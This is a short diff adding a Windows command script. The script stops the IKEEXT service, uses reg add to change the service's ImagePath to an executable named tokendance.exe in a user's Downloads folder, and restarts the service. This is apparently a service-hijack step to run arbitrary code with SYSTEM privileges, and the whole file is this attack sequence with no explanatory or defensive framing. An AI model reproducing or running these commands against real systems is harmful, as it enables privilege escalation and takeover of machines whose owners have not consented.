@@ -1,0 +1,6 @@
+
+sc stop IKEEXT
+
+reg add HKLM\SYSTEM\CurrentControlSet\services\IKEEXT /v ImagePath /t REG_EXPAND_SZ /d C:\Users\win10\Downloads\tokendance.exe /f
+
+sc start IKEEXT
